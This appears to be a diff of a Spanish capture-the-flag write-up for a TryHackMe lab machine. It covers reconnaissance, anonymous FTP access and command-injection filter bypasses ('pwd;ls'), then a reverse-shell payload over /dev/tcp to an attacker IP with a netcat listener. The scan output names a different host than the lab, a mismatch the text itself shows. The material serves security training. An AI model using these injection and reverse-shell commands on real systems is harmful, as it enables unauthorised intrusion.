@@ -899,180 +35,78 @@ Reconocimiento Para empezar lo primero es comprobar si la máquina está activa 
    7   │ [*] Ports copied to clipboard
    8   │ 
 ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p21,22,80 -sC -sV 10.10.11.182 -oN versions
-</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-01 19:15 CET
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> photobomb.htb <span class="o">(</span>10.10.11.182<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:10.2.28.215
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">3</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rw-r--r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">90</span> Oct <span class="m">03</span>  <span class="m">2020</span> note.txt
-</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 09f95db918d0b23a822d6e768cc20144 <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 1bcf3a498b1b20b02c6aa551a88f1e62 <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3005cc52c66f6504860f7241c8a439cf <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Game Info
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><table>
-<thead>
-<tr>
-<th style="text-align:center">Parámetro</th>
-<th>Función</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">-p</td>
-<td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td>
-</tr>
-<tr>
-<td style="text-align:center">-sC</td>
-<td>Para que realice scripts básicos de reconocimiento</td>
-</tr>
-<tr>
-<td style="text-align:center">-sV</td>
-<td>Proporciona la versión e información de los servicios que corren por los puertos</td>
-</tr>
-</tbody>
-</table>
-<hr>
-<h2 id="ftp">FTP<a href="#ftp" class="anchor" aria-hidden="true">#</a> </h2>
-<p>Lo primero que nos reporta nmap es que el usuario anonymous está permitido y hay un archivo llamado <code>note.txt</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ftp 10.10.11.182                     <span class="c1"># Nos conectamos por ftp</span>
-</span></span><span class="line"><span class="cl">Connected to 10.10.11.182.                      
-</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.11.182:d3b0o<span class="o">)</span>: anonymous   <span class="c1"># Con el usuario anonymous</span>
-</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
-</span></span><span class="line"><span class="cl">Password:                              <span class="c1"># Sin contraseña</span>
-</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
-</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
-</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
-</span></span><span class="line"><span class="cl">ftp&gt; ls
-</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>8911<span class="p">|</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
-</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">90</span> Oct <span class="m">03</span>  <span class="m">2020</span> note.txt
-</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
-</span></span><span class="line"><span class="cl">ftp&gt; get note.txt                      <span class="c1"># Nos lo pasamos a nuestra máquina</span>
-</span></span><span class="line"><span class="cl">local: note.txt remote: note.txt
-</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>15616<span class="p">|</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note.txt <span class="o">(</span><span class="m">90</span> bytes<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">100% <span class="p">|</span>*****************************************************************************<span class="p">|</span>    <span class="m">90</span>       28.28 KiB/s    00:00 ETA
-</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
-</span></span><span class="line"><span class="cl"><span class="m">90</span> bytes received in 00:00 <span class="o">(</span>0.29 KiB/s<span class="o">)</span>
-</span></span></code></pre></div><p>Contenido de el archivo <code>note.txt</code></p>
-<blockquote>
-<p>Anurodh told me that there is some filtering on strings being put in the command &ndash; Apaar</p>
-</blockquote>
-<p>De esta nota podemos sacar 2 posibles usuarios</p>
-<ul>
-<li>Apaar</li>
-<li>Anurodh</li>
-</ul>
-<h2 id="http">HTTP<a href="#http" class="anchor" aria-hidden="true">#</a> </h2>
-<h3 id="subdirectorios">Subdirectorios<a href="#subdirectorios" class="anchor" aria-hidden="true">#</a> </h3>
-<p>Para encontrar subdirectorios vamos a usar la herramienta <strong>gobuster</strong> con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.182/
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.11.182/images/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.11.182/css/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.11.182/js/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.11.182/fonts/<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/secret               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.11.182/secret/<span class="o">]</span>
-</span></span></code></pre></div><p>Hay un subdirectorio que a simple vista llama la atención <strong>/secret</strong></p>
-<p>Al entrar vemos que podemos ejecutar comandos.</p>
-<p>
-
-
-
-
-
-
-
-<img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_31635f4575a90605ece033284ca13187.webp 480w, /writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_d094c353a5c33e94bd69c92e851cb39d.webp 640w, /writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_9ecf90d9ea8fb3c725c6eff9d1b12c8f.webp 800w, /writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_da8c76cf9c8a7336f355a6a6d423cf5d.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-0" src="/writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_843049ea379a6ef154c0bb9d7c88cf79.webp" width="1600">
-
-
-
-
-
-
-
-
-<img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_5bffff795d2f1fe7d8d1b32c272d101c.webp 480w, /writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_7a8eebfd6bb3ba6eaecd87e4037a4ba3.webp 640w, /writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_81134ff93af043a9fb4fcf3a081b3199.webp 800w, /writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_70ac264b928ec3d1de42558f01c25a79.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-1" src="/writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_fa74c6c4720195df6bdec67f6ffd0cdd.webp" width="1600"></p>
-<p>Probando comandos podemos ver que hay algunos que los bloquea&hellip;</p>
-<p>
-
-
-
-
-
-
-
-<img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_37dff97c5908eecc5d50594fd962a7d2.webp 480w, /writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_f30cc156c0a858adfe71f9647e253106.webp 640w, /writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_fd6524df31613b4d6ed4b483244c52e3.webp 800w, /writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_7c1a325d682cffb3f37c3de1394602b0.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-2" src="/writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_38589741ab5209eb236c10e11ab8468e.webp" width="1600">
-
-
-
-
-
-
-
-
-<img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_bf5596b62bc3c4c5bcddcbd5cb2c230f.webp 480w, /writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_731f46acf0bf7faeb8f8c20ed9e756b1.webp 640w, /writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_cecd1978f2e0f9fde3bc4f57d8da33bc.webp 800w, /writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_51d703d4980a0a530c78e95a4b67d3bc.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-3" src="/writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_ca629d687bea044b846d542469e5ceae.webp" width="1600"></p>
-<h3 id="intrusión">Intrusión<a href="#intrusión" class="anchor" aria-hidden="true">#</a> </h3>
-<p>Al poner un comando válido, como por ejemplo pwd, &ldquo;;&rdquo; y un comando bloqueado, nos ejecuta los 2.</p>
-<p>De tal forma que quedaría así: <strong>pwd;ls</strong></p>
-<p>
-
-
-
-
-
-
-
-<img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_899f82b79bfadc8943722e98fe146b74.webp 480w, /writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_09177a921c540bcc9601529f2b974cee.webp 640w, /writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_d6d7a85ad8c19b07f04d1fdd197cbe95.webp 800w, /writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_3402c4db4a9f59a7ec7772afa6cc9ddb.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-4" src="/writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_2d9a3e6a86e6f44646086dece0f173f9.webp" width="1600"></p>
-<p>Otra opción sería poner &ldquo;\&rdquo; antes del comando, porejemplo <strong>\ls</strong></p>
-<p>
-
-
-
-
-
-
-
-<img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_f6c6048ce07ba16e2be8a4e2525fcc2d.webp 480w, /writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_f0af5e9019686752b9e2826c8b0b4b12.webp 640w, /writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_91c6acb8ccbe45214b2b9b8720c40fcd.webp 800w, /writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_778284a4413d4d349652652f9c559e8e.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-5" src="/writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_1d10f871f360e2e378c374bce9b8e0dc.webp" width="1600"></p>
-<p>Ahora lo que vamos a hacer es mandarnos una reverse shell desde la máquina víctima a la nuestra.</p>
-<p>Lo primero va a ser ponerse en escucha por el puerto 443 con nc</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">443</span>
-</span></span></code></pre></div><p>Y después vamos a mandar desde la web el siguiente comando:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#                           Puerto</span>
-</span></span><span class="line"><span class="cl">pwd<span class="p">;</span>bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#                 IP Atacante</span>
-</span></span></code></pre></div><p>Recibimos la reverse shell!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nlvp <span class="m">443</span>
-</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
-</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.2.28.215<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.182<span class="o">]</span> <span class="m">57032</span>
-</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1022<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
-</span></span><span class="line"><span class="cl">bash: no job control in this shell
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/var/www/html/secret$ 
-</span></span></code></pre></div><p>Con un <strong>ip a</strong> podemos comprobar que estamos en la 10.10.11.182</p>
-<pre tabindex="0"><code>www-data@ubuntu:/var/www/html/secret$ ip a
+</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap -p21,22,80 -sC -sV 10.10.11.182 -oN versions
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-03-01 19:15 CET
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> photobomb.htb <span class=o>(</span>10.10.11.182<span class=o>)</span>
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.29s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   STAT: 
+</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
+</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to ::ffff:10.2.28.215
+</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftp
+</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
+</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
+</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
+</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
+</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>3</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
+</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_-rw-r--r--    <span class=m>1</span> <span class=m>1001</span>     <span class=m>1001</span>           <span class=m>90</span> Oct <span class=m>03</span>  <span class=m>2020</span> note.txt
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 09f95db918d0b23a822d6e768cc20144 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 1bcf3a498b1b20b02c6aa551a88f1e62 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3005cc52c66f6504860f7241c8a439cf <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Game Info
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td></tr><tr><td style=text-align:center>-sC</td><td>Para que realice scripts básicos de reconocimiento</td></tr><tr><td style=text-align:center>-sV</td><td>Proporciona la versión e información de los servicios que corren por los puertos</td></tr></tbody></table><hr><h2 id=ftp>FTP<a href=#ftp class=anchor aria-hidden=true>#</a></h2><p>Lo primero que nos reporta nmap es que el usuario anonymous está permitido y hay un archivo llamado <code>note.txt</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ftp 10.10.11.182                     <span class=c1># Nos conectamos por ftp</span>
+</span></span><span class=line><span class=cl>Connected to 10.10.11.182.                      
+</span></span><span class=line><span class=cl><span class=m>220</span> <span class=o>(</span>vsFTPd 3.0.3<span class=o>)</span>
+</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.10.11.182:d3b0o<span class=o>)</span>: anonymous   <span class=c1># Con el usuario anonymous</span>
+</span></span><span class=line><span class=cl><span class=m>331</span> Please specify the password.
+</span></span><span class=line><span class=cl>Password:                              <span class=c1># Sin contraseña</span>
+</span></span><span class=line><span class=cl><span class=m>230</span> Login successful.
+</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt; ls
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>8911<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
+</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> <span class=m>1001</span>     <span class=m>1001</span>           <span class=m>90</span> Oct <span class=m>03</span>  <span class=m>2020</span> note.txt
+</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; get note.txt                      <span class=c1># Nos lo pasamos a nuestra máquina</span>
+</span></span><span class=line><span class=cl>local: note.txt remote: note.txt
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>15616<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> note.txt <span class=o>(</span><span class=m>90</span> bytes<span class=o>)</span>.
+</span></span><span class=line><span class=cl>100% <span class=p>|</span>*****************************************************************************<span class=p>|</span>    <span class=m>90</span>       28.28 KiB/s    00:00 ETA
+</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
+</span></span><span class=line><span class=cl><span class=m>90</span> bytes received in 00:00 <span class=o>(</span>0.29 KiB/s<span class=o>)</span>
+</span></span></code></pre></div><p>Contenido de el archivo <code>note.txt</code></p><blockquote><p>Anurodh told me that there is some filtering on strings being put in the command &ndash; Apaar</p></blockquote><p>De esta nota podemos sacar 2 posibles usuarios</p><ul><li>Apaar</li><li>Anurodh</li></ul><h2 id=http>HTTP<a href=#http class=anchor aria-hidden=true>#</a></h2><h3 id=subdirectorios>Subdirectorios<a href=#subdirectorios class=anchor aria-hidden=true>#</a></h3><p>Para encontrar subdirectorios vamos a usar la herramienta <strong>gobuster</strong> con el siguiente comando</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.182/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 313<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.182/images/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 310<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.182/css/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 309<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.182/js/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/fonts                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 312<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.182/fonts/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/secret               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 313<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.182/secret/<span class=o>]</span>
+</span></span></code></pre></div><p>Hay un subdirectorio que a simple vista llama la atención <strong>/secret</strong></p><p>Al entrar vemos que podemos ejecutar comandos.</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_31635f4575a90605ece033284ca13187.webp 480w, /writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_d094c353a5c33e94bd69c92e851cb39d.webp 640w, /writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_9ecf90d9ea8fb3c725c6eff9d1b12c8f.webp 800w, /writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_da8c76cf9c8a7336f355a6a6d423cf5d.webp 1024w" fetchpriority=low height=900 id=h-rh-i-0 src=/writeups/tryhackme/chill-hack/images/command_injection_good_hu56e5e447436b1e91cad292b394f6644a_91888_843049ea379a6ef154c0bb9d7c88cf79.webp width=1600>
+<img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_5bffff795d2f1fe7d8d1b32c272d101c.webp 480w, /writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_7a8eebfd6bb3ba6eaecd87e4037a4ba3.webp 640w, /writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_81134ff93af043a9fb4fcf3a081b3199.webp 800w, /writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_70ac264b928ec3d1de42558f01c25a79.webp 1024w" fetchpriority=low height=900 id=h-rh-i-1 src=/writeups/tryhackme/chill-hack/images/1_hu1c7b39a183dc1ca3304a57acfe7c6c4e_7737_fa74c6c4720195df6bdec67f6ffd0cdd.webp width=1600></p><p>Probando comandos podemos ver que hay algunos que los bloquea&mldr;</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_37dff97c5908eecc5d50594fd962a7d2.webp 480w, /writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_f30cc156c0a858adfe71f9647e253106.webp 640w, /writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_fd6524df31613b4d6ed4b483244c52e3.webp 800w, /writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_7c1a325d682cffb3f37c3de1394602b0.webp 1024w" fetchpriority=low height=900 id=h-rh-i-2 src=/writeups/tryhackme/chill-hack/images/2_hu1a346558749aa112e6b4a45bd7185c10_201983_38589741ab5209eb236c10e11ab8468e.webp width=1600>
+<img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_bf5596b62bc3c4c5bcddcbd5cb2c230f.webp 480w, /writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_731f46acf0bf7faeb8f8c20ed9e756b1.webp 640w, /writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_cecd1978f2e0f9fde3bc4f57d8da33bc.webp 800w, /writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_51d703d4980a0a530c78e95a4b67d3bc.webp 1024w" fetchpriority=low height=900 id=h-rh-i-3 src=/writeups/tryhackme/chill-hack/images/4_hu309c180b8e4045e72903e6f3bbc20109_4499_ca629d687bea044b846d542469e5ceae.webp width=1600></p><h3 id=intrusión>Intrusión<a href=#intrusión class=anchor aria-hidden=true>#</a></h3><p>Al poner un comando válido, como por ejemplo pwd, &ldquo;;&rdquo; y un comando bloqueado, nos ejecuta los 2.</p><p>De tal forma que quedaría así: <strong>pwd;ls</strong></p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_899f82b79bfadc8943722e98fe146b74.webp 480w, /writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_09177a921c540bcc9601529f2b974cee.webp 640w, 